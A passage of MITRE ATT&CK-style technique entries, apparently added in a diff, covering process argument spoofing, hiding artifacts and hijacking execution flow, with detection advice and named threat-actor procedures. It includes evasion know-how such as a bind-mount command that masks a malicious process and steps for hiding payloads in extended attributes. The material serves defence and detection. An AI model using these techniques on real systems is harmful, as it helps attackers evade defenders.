+Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB. Adversaries may manipulate a process PEB to evade defenses. For example, Process Hollowing can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the Native API WriteProcessMemory() function) then resume process execution with malicious arguments. Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis. This behavior may also be combined with other tricks (such as Parent PID Spoofing) to manipulate or further evade process-based detections.
+
+Detection:
+
+Detection of process argument spoofing may be difficult as adversaries may momentarily modify stored arguments used for malicious execution. These changes may bypass process creation detection and/or later process memory analysis. Consider monitoring for Process Hollowing, which includes monitoring for process creation (especially those in a suspended state) as well as access and/or modifications of these processes (especially by the parent process) via Windows API calls. Analyze process behavior to determine if a process is performing actions it usually does not and/or do no align with its logged command-line arguments.
+
+Procedures:
+
+- [S0154] Cobalt Strike: Cobalt Strike can use spoof arguments in spawned processes that execute beacon commands.
+- [S0615] SombRAT: SombRAT has the ability to modify its process memory to hide process command-line arguments.
+
+### T1564.011 - Hide Artifacts: Ignore Process Interrupts
+
+Description:
+
+Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off. These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. Adversaries may invoke processes using `nohup`, PowerShell `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups. This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection. Hiding from process interrupt signals may allow malware to continue execution, but unlike Trap this does not establish Persistence since the process will not be re-invoked once actually terminated.
+
+Procedures:
+
+- [S0588] GoldMax: The GoldMax Linux variant has been executed with the `nohup` command to ignore hangup signals and continue to run if the terminal session was terminated.
+- [S1184] BOLDMOVE: BOLDMOVE calls the signal function to ignore the signals SIGCHLD, SIGHIP, and SIGPIPE prior to starting primary logic.
+- [G1041] Sea Turtle: Sea Turtle executed SnappyTCP using the tool NoHup, which keeps the malware running on a system after exiting the shell or terminal.
+- [S0402] OSX/Shlayer: OSX/Shlayer has used the `nohup` command to instruct executed payloads to ignore hangup signals.
+- [S1161] BPFDoor: BPFDoor set's it's process to ignore the following signals; `SIGHUP`, `SIGINT`, `SIGQUIT`, `SIGPIPE`, `SIGCHLD`, `SIGTTIN`, and `SIGTTOU`.
+
+### T1564.012 - Hide Artifacts: File/Path Exclusions
+
+Description:
+
+Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate. Adversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than tampering with tool settings to add a new exclusion (i.e., Disable or Modify Tools), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use Security Software Discovery and other Discovery/Reconnaissance activities to both discover and verify existing exclusions in a victim environment.
+
+Procedures:
+
+- [G0010] Turla: Turla has placed LunarWeb install files into directories that are excluded from scanning.
+
+### T1564.013 - Hide Artifacts: Bind Mounts
+
+Description:
+
+Adversaries may abuse bind mounts on file structures to hide their activity and artifacts from native utilities. A bind mount maps a directory or file from one location on the filesystem to another, similar to a shortcut on Windows. It’s commonly used to provide access to specific files or directories across different environments, such as inside containers or chroot environments, and requires sudo access. Adversaries may use bind mounts to map either an empty directory or a benign `/proc` directory to a malicious process’s `/proc` directory. Using the commands `mount –o bind /proc/benign-process /proc/malicious-process` (or `mount –B`), the malicious process's `/proc` directory is overlayed with the contents of a benign process's `/proc` directory. When system utilities query process activity, such as `ps` and `top`, the kernel follows the bind mount and presents the benign directory’s contents instead of the malicious process's actual `/proc` directory. As a result, these utilities display information that appears to come from the benign process, effectively hiding the malicious process's metadata, executable, or other artifacts from detection.
+
+Procedures:
+
+- [C0035] KV Botnet Activity: KV Botnet Activity leveraged a bind mount to bind itself to the `/proc/` file path before deleting its files from the `/tmp/` directory.
+
+### T1564.014 - Hide Artifacts: Extended Attributes
+
+Description:
+
+Adversaries may abuse extended attributes (xattrs) on macOS and Linux to hide their malicious data in order to evade detection. Extended attributes are key-value pairs of file and directory metadata used by both macOS and Linux. They are not visible through standard tools like `Finder`, `ls`, or `cat` and require utilities such as `xattr` (macOS) or `getfattr` (Linux) for inspection. Operating systems and applications use xattrs for tagging, integrity checks, and access control. On Linux, xattrs are organized into namespaces such as `user.` (user permissions), `trusted.` (root permissions), `security.`, and `system.`, each with specific permissions. On macOS, xattrs are flat strings without namespace prefixes, commonly prefixed with `com.apple.*` (e.g., `com.apple.quarantine`, `com.apple.metadata:_kMDItemUserTags`) and used by system features like Gatekeeper and Spotlight. An adversary may leverage xattrs by embedding a second-stage payload into the extended attribute of a legitimate file. On macOS, a payload can be embedded into a custom attribute using the `xattr` command. A separate loader can retrieve the attribute with `xattr -p`, decode the content, and execute it using a scripting interpreter. On Linux, an adversary may use `setfattr` to write a payload into the `user.` namespace of a legitimate file. A loader script can later extract the payload with `getfattr --only-values`, decode it, and execute it using bash or another interpreter. In both cases, because the primary file content remains unchanged, security tools and integrity checks that do not inspect extended attributes will observe the original file hash, allowing the malicious payload to evade detection.
+
+
+### T1574.001 - Hijack Execution Flow: DLL
+
+Description:
+
+Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking. Specific ways DLLs are abused by adversaries include: ### DLL Sideloading Adversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s). Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process. Adversaries may also side-load other packages, such as BPLs (Borland Package Library). ### DLL Search Order Hijacking Adversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program. ### DLL Redirection Adversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location. ### Phantom DLL Hijacking Adversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module. ### DLL Substitution Adversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file. Programs that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses. Remote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL. If a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.
+
+Detection:
+
+Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of `.manifest` and `.local` redirection files that do not correlate with software updates are suspicious.
+
+Procedures:
+
+- [G0114] Chimera: Chimera has used side loading to place malicious DLLs in memory.
+- [G1021] Cinnamon Tempest: Cinnamon Tempest has used search order hijacking to launch Cobalt Strike Beacons. Cinnamon Tempest has also abused legitimate executables to side-load weaponized DLLs.
+- [S1041] Chinoxy: Chinoxy can use a digitally signed binary ("Logitech Bluetooth Wizard Host Process") to load its dll into memory.
+- [G0069] MuddyWater: MuddyWater maintains persistence on victim networks through side-loading dlls to trick legitimate programs into running malware.
+- [S0384] Dridex: Dridex can abuse legitimate Windows executables to side-load malicious DLL files.
+- [G1047] Velvet Ant: Velvet Ant has used malicious DLLs executed via legitimate EXE files through DLL search order hijacking to launch follow-on payloads such as PlugX.
+- [S0664] Pandora: Pandora can use DLL side-loading to execute malicious payloads.
+- [G0048] RTM: RTM has used search order hijacking to force TeamViewer to load a malicious DLL.
+- [G0131] Tonto Team: Tonto Team abuses a legitimate and signed Microsoft executable to launch a malicious DLL.
+- [G0040] Patchwork: A Patchwork .dll that contains BADNEWS is loaded and executed using DLL side-loading.
+- [S0070] HTTPBrowser: HTTPBrowser abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll. HTTPBrowser has also used DLL side-loading.
+- [S0109] WEBC2: Variants of WEBC2 achieve persistence by using DLL search order hijacking, usually by copying the DLL file to %SYSTEMROOT% (C:\WINDOWS\ntshrui.dll).
+- [S0009] Hikit: Hikit has used DLL to load oci.dll as a persistence mechanism.
+- [S0176] Wingbird: Wingbird side loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service.
+- [S0528] Javali: Javali can use DLL side-loading to load malicious DLLs into legitimate executables.
+- [S0128] BADNEWS: BADNEWS typically loads its DLL file into a legitimate signed Java or VMware executable.
+- [G0107] Whitefly: Whitefly has used search order hijacking to run the loader Vcrodat.
+- [C0047] RedDelta Modified PlugX Infection Chain Operations: Mustang Panda used DLL search order hijacking on vulnerable applications to install PlugX payloads during RedDelta Modified PlugX Infection Chain Operations.
+- [S0182] FinFisher: FinFisher uses DLL side-loading to load malicious programs. A FinFisher variant also uses DLL search order hijacking.
+- [G0143] Aquatic Panda: Aquatic Panda has used DLL search-order hijacking to load `exe`, `dll`, and `dat` files into memory. Aquatic Panda loaded a malicious DLL into the legitimate Windows Security Health Service executable (SecurityHealthService.exe) to execute malicious code on victim systems.
+- [S0398] HyperBro: HyperBro has used a legitimate application to sideload a DLL to decrypt, decompress, and run a payload.
+- [G0093] GALLIUM: GALLIUM used DLL side-loading to covertly load PoisonIvy into memory on the victim machine.
+- [S0153] RedLeaves: RedLeaves is launched through use of DLL search order hijacking to load a malicious dll.
+- [G0126] Higaisa: Higaisa’s JavaScript file used a legitimate Microsoft Office 2007 package to side-load the OINFO12.OCX dynamic link library.
+- [S0455] Metamorfo: Metamorfo has side-loaded its malicious DLL file.
+- [S0579] Waterbear: Waterbear has used DLL side loading to import and load a malicious DLL loader.
+- [S0230] ZeroT: ZeroT has used DLL side-loading to load malicious payloads.
+- [G0050] APT32: APT32 ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL. The group also side-loads its backdoor by dropping a library and a legitimate, signed executable (AcroTranscoder).
+- [S0013] PlugX: PlugX has the ability to use DLL search order hijacking for installation on targeted systems. PlugX has also used DLL side-loading to evade anti-virus.
+- [S0458] Ramsay: Ramsay can hijack outdated Windows application dependencies with malicious versions of its own DLL payload.
+- [G1046] Storm-1811: Storm-1811 has deployed a malicious DLL (7z.DLL) that is sideloaded by a modified, legitimate installer (7zG.exe) when that installer is executed with an additional command line parameter of `b` at runtime to load a Cobalt Strike beacon payload.
+- [S0074] Sakula: Sakula uses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files.
+- [S1213] Lumma Stealer: Lumma Stealer has leveraged legitimate applications to then side-load malicious DLLs during execution.
+- [S0098] T9000: During the T9000 installation process, it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware.
+- [G0120] Evilnum: Evilnum has used the malware variant, TerraTV, to load a malicious DLL placed in the TeamViewer directory, instead of the original Windows DLL located in a system folder.
+- [S0032] gh0st RAT: A gh0st RAT variant has used DLL side-loading.
+- [S0127] BBSRAT: DLL side-loading has been used to execute BBSRAT through a legitimate Citrix executable, ssonsvr.exe. The Citrix executable was dropped along with BBSRAT by the dropper.
+- [S1100] Ninja: Ninja loaders can be side-loaded with legitimate and signed executables including the VLC.exe media player.
+- [S0113] Prikormka: Prikormka uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory.
+- [S0373] Astaroth: Astaroth can launch itself via DLL Search Order Hijacking.
+- [S0650] QakBot: QakBot has the ability to use DLL side-loading for execution.
+- [S1130] Raspberry Robin: Raspberry Robin can use legitimate, signed EXE files paired with malicious DLL files to load and run malicious payloads while bypassing defenses.
+- [G0081] Tropic Trooper: Tropic Trooper has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools.
+- [G1006] Earth Lusca: Earth Lusca has placed a malicious payload in `%WINDIR%\SYSTEM32\oci.dll` so it would be sideloaded by the MSDTC service.
+- [S0585] Kerrdown: Kerrdown can use DLL side-loading to load malicious DLLs.
+- [G1014] LuminousMoth: LuminousMoth has used legitimate executables such as `winword.exe` and `igfxem.exe` to side-load their malware.
+- [S0530] Melcoz: Melcoz can use DLL hijacking to bypass security controls.
+- [S1101] LoFiSe: LoFiSe has been executed as a file named DsNcDiag.dll through side-loading.
+- [G0060] BRONZE BUTLER: BRONZE BUTLER has used legitimate applications to side-load malicious DLLs.
+- [S0280] MirageFox: MirageFox is likely loaded via DLL hijacking into a legitimate McAfee binary.
+- [S1183] StrelaStealer: StrelaStealer has sideloaded a DLL payload using a renamed, legitimate `msinfo32.exe` executable.
+- [G0022] APT3: APT3 has been known to side load DLLs with a valid version of Chrome with one of their tools.
+- [S0194] PowerSploit: PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes.
+- [G0098] BlackTech: BlackTech has used DLL side loading by giving DLLs hardcoded names and placing them in searched directories.
+- [S0661] FoggyWeb: FoggyWeb's loader has used DLL Search Order Hijacking to load malicious code instead of the legitimate `version.dll` during the `Microsoft.IdentityServer.ServiceHost.exe` execution process.
+- [S0554] Egregor: Egregor has used DLL side-loading to execute its payload.
+- [G1016] FIN13: FIN13 has used IISCrack.dll as a side-loading technique to load a malicious version of httpodbc.dll on old IIS Servers (CVE-2001-0507).
+- [G0129] Mustang Panda: Mustang Panda has used a legitimately signed executable to execute a malicious payload within a DLL file.
+- [S0612] WastedLocker: WastedLocker has performed DLL hijacking before execution.
+- [S0538] Crutch: Crutch can persist via DLL search order hijacking on Google Chrome, Mozilla Firefox, or Microsoft OneDrive.
+- [S0630] Nebulae: Nebulae can use DLL side-loading to gain execution.
+- [G1008] SideCopy: SideCopy has used a malicious loader DLL file to execute the `credwiz.exe` process and side-load the malicious payload `Duser.dll`.
+- [S0631] Chaes: Chaes has used search order hijacking to load a malicious DLL.
+- [S1046] PowGoop: PowGoop can side-load `Goopdate.dll` into `GoogleUpdate.exe`.
+- [S1059] metaMain: metaMain can support an HKCMD sideloading start method.
+- [S1111] DarkGate: DarkGate includes one infection vector that leverages a malicious "KeyScramblerE.DLL" library that will load during the execution of the legitimate KeyScrambler application.
+- [C0040] APT41 DUST: APT41 DUST involved the use of DLL search order hijacking to execute DUSTTRAP. APT41 DUST used also DLL side-loading to execute DUSTTRAP via an AhnLab uninstaller.
+- [G1034] Daggerfly: Daggerfly has used legitimate software to side-load PlugX loaders onto victim systems. Daggerfly is also linked to multiple other instances of side-loading for initial loading activity.
+- [S1097] HUI Loader: HUI Loader can be deployed to targeted systems via legitimate programs that are vulnerable to DLL search order hijacking.
+- [S0663] SysUpdate: SysUpdate can load DLLs through vulnerable legitimate executables.
+- [S0477] Goopy: Goopy has the ability to side-load malicious DLLs with legitimate applications from Kaspersky, Microsoft, and Google.
+- [S0624] Ecipekac: Ecipekac can abuse the legitimate application policytool.exe to load a malicious DLL.
+- [S1102] Pcexter: Pcexter has been distributed and executed as a DLL file named Vspmsg.dll via DLL side-loading.
+- [G0019] Naikon: Naikon has used DLL side-loading to load malicious DLL's into legitimate executables.
+- [G0032] Lazarus Group: Lazarus Group has replaced `win_fw.dll`, an internal component that is executed during IDA Pro installation, with a malicious DLL to download and execute a payload. Lazarus Group utilized DLL side-loading to execute malicious payloads through abuse of the legitimate processes `wsmprovhost.exe` and `dfrgui.exe`.
+- [C0012] Operation CuckooBees: During Operation CuckooBees, the threat actors used the legitimate Windows services `IKEEXT` and `PrintNotify` to side-load malicious DLLs.
+- [S0260] InvisiMole: InvisiMole can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library.
+- [S0354] Denis: Denis exploits a security vulnerability to load a fake DLL and execute its code.
+- [G0027] Threat Group-3390: Threat Group-3390 has performed DLL search order hijacking to execute their payload. Threat Group-3390 has also used DLL side-loading, including by using legitimate Kaspersky antivirus variants as well as `rc.exe`, a legitimate Microsoft Resource Compiler.
+- [G0135] BackdoorDiplomacy: BackdoorDiplomacy has executed DLL search order hijacking.
+- [S0629] RainyDay: RainyDay can use side-loading to run malicious executables.
+- [S0415] BOOSTWRITE: BOOSTWRITE has exploited the loading of the legitimate Dwrite.dll file by actually loading the gdi library, which then loads the gdiplus library and ultimately loads the local Dwrite dll.
+- [S0660] Clambling: Clambling can store a file named `mpsvc.dll`, which opens a malicious `mpsvc.mui` file, in the same folder as the legitimate Microsoft executable `MsMpEng.exe` to gain execution.
+- [S0662] RCSession: RCSession can be installed via DLL side-loading.
+- [S0363] Empire: Empire contains modules that can discover and exploit various DLL hijacking opportunities.
+- [S1063] Brute Ratel C4: Brute Ratel C4 has used search order hijacking to load a malicious payload DLL as a dependency to a benign application packaged in the same ISO. Brute Ratel C4 has loaded a malicious DLL by spoofing the name of the legitimate Version.DLL and placing it in the same folder as the digitally-signed Microsoft binary OneDriveUpdater.exe.
+- [G0073] APT19: APT19 launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.
+- [S0134] Downdelph: Downdelph uses search order hijacking of the Windows executable sysprep.exe to escalate privileges.
+- [S0582] LookBack: LookBack side loads its communications module as a DLL into the libcurl.dll loader.
+- [G0121] Sidewinder: Sidewinder has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe.
+- [G0096] APT41: APT41 has used search order hijacking to execute malicious payloads, such as Winnti for Windows. APT41 has also used legitimate executables to perform DLL side-loading of their malware.
+- [G0045] menuPass: menuPass has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as UPPERCUT. menuPass has also used DLL search order hijacking.
+
+### T1574.004 - Hijack Execution Flow: Dylib Hijacking
+
+Description:
+
+Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with @rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable. Additionally, if weak linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added. Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path. Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.
+
+Detection:
+
+Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process. Run path dependent libraries can include LC_LOAD_DYLIB, LC_LOAD_WEAK_DYLIB, and LC_RPATH. Other special keywords are recognized by the macOS loader are @rpath, @loader_path, and @executable_path. These loader instructions can be examined for individual binaries or frameworks using the otool -l command. Objective-See's Dylib Hijacking Scanner can be used to identify applications vulnerable to dylib hijacking.
+
+Procedures:
+
+- [S0363] Empire: Empire has a dylib hijacker module that generates a malicious dylib given the path to a legitimate dylib of a vulnerable application.
+
+### T1574.005 - Hijack Execution Flow: Executable Installer File Permissions Weakness
+
+Description:
+
+Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM. Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL search order hijacking. Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.
+
+Detection:
+
+Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data. Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.
+
+### T1574.006 - Hijack Execution Flow: Dynamic Linker Hijacking
+
+Description:
+
+Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library. Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have used `LD_PRELOAD` to inject a malicious library into every descendant process of the `sshd` daemon, resulting in execution under a legitimate process. When the executing sub-process calls the `execve` function, for example, the malicious library’s `execve` function is executed rather than the system function `execve` contained in the system library on disk. This allows adversaries to Hide Artifacts from detection, as hooking system functions such as `execve` and `readdir` enables malware to scrub its own artifacts from the results of commands such as `ls`, `ldd`, `iptables`, and `dmesg`. Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.
+
+Detection:
+
+Monitor for changes to environment variables and files associated with loading shared libraries such as LD_PRELOAD and DYLD_INSERT_LIBRARIES, as well as the commands to implement these changes. Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.
+
+Procedures:
+
+- [G0143] Aquatic Panda: Aquatic Panda modified the ld.so preload file in Linux environments to enable persistence for Winnti malware.
+- [G0106] Rocke: Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.
+- [S0601] Hildegard: Hildegard has modified /etc/ld.so.preload to intercept shared library import functions.
+- [S0394] HiddenWasp: HiddenWasp adds itself as a shared object to the LD_PRELOAD environment variable.
+- [S0658] XCSSET: XCSSET adds malicious file paths to the DYLD_FRAMEWORK_PATH and DYLD_LIBRARY_PATH environment variables to execute malicious code.
+- [G0096] APT41: APT41 has configured payloads to load via LD_PRELOAD.
+- [S1105] COATHANGER: COATHANGER copies the malicious file /data2/.bd.key/preload.so to /lib/preload.so, then launches a child process that executes the malicious file /data2/.bd.key/authd as /bin/authd with the arguments /lib/preload.so reboot newreboot 1. This injects the malicious preload.so file into the process with PID 1, and replaces its reboot function with the malicious newreboot function for persistence.
+- [S0377] Ebury: When Ebury is running as an OpenSSH server, it uses LD_PRELOAD to inject its malicious shared module in to programs launched by SSH sessions. Ebury hooks the following functions from `libc` to inject into subprocesses; `system`, `popen`, `execve`, `execvpe`, `execv`, `execvp`, and `execl`.
+
+### T1574.007 - Hijack Execution Flow: Path Interception by PATH Environment Variable
+
+Description:
+
+Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. Adversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing. For example, on Windows if an adversary places a malicious program named "net.exe" in `C:\example path`, which by default precedes `C:\Windows\system32\net.exe` in the PATH environment variable, when "net" is executed from the command-line the `C:\example path` will be called instead of the system's legitimate executable at `C:\Windows\system32\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a Command and Scripting Interpreter. Adversaries may also directly modify the $PATH variable specifying the directories to be searched. An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, Unix Shell Configuration Modification, or modifying the `/etc/paths.d` folder contents.
+
+Detection:
+
+Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as "findstr," "net," and "python"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
+
+Procedures:
+
+- [S0194] PowerSploit: PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit path interception opportunities in the PATH environment variable.
+- [S0363] Empire: Empire contains modules that can discover and exploit path interception opportunities in the PATH environment variable.
+- [S1111] DarkGate: DarkGate overrides the %windir% environment variable by setting a Registry key, HKEY_CURRENT_User\Environment\windir, to an alternate command to execute a malicious AutoIt script. This allows DarkGate to run every time the scheduled task DiskCleanup is executed as this uses the path value %windir%\system32\cleanmgr.exe for execution.
+
+### T1574.008 - Hijack Execution Flow: Path Interception by Search Order Hijacking
+
+Description:
+
+Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program. Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL search order hijacking, the search order differs depending on the method that is used to execute the program. However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory. For example, "example.exe" runs "cmd.exe" with the command-line argument net user. An adversary may place a program called "net.exe" within the same directory as example.exe, "net.exe" will be run instead of the Windows system utility net. In addition, if an adversary places a program called "net.com" in the same directory as "net.exe", then cmd.exe /C net user will execute "net.com" instead of "net.exe" due to the order of executable extensions defined under PATHEXT. Search order hijacking is also a common practice for hijacking DLL loads and is covered in DLL.
+
+Detection:
+
+Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as "findstr," "net," and "python"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
+
+Procedures:
+
+- [S0363] Empire: Empire contains modules that can discover and exploit search order hijacking vulnerabilities.
+- [S0194] PowerSploit: PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit search order hijacking vulnerabilities.
+
+### T1574.009 - Hijack Execution Flow: Path Interception by Unquoted Path
+
+Description:
+
+Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch. Service paths and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\unsafe path with space\program.exe vs. "C:\safe path with space\program.exe"). (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\program files\myapp.exe, an adversary may create a program at C:\program.exe that will be run instead of the intended program. This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.
+
+Detection:
+
+Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as "findstr," "net," and "python"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
+
+Procedures:
+
+- [S0194] PowerSploit: PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit unquoted path vulnerabilities.
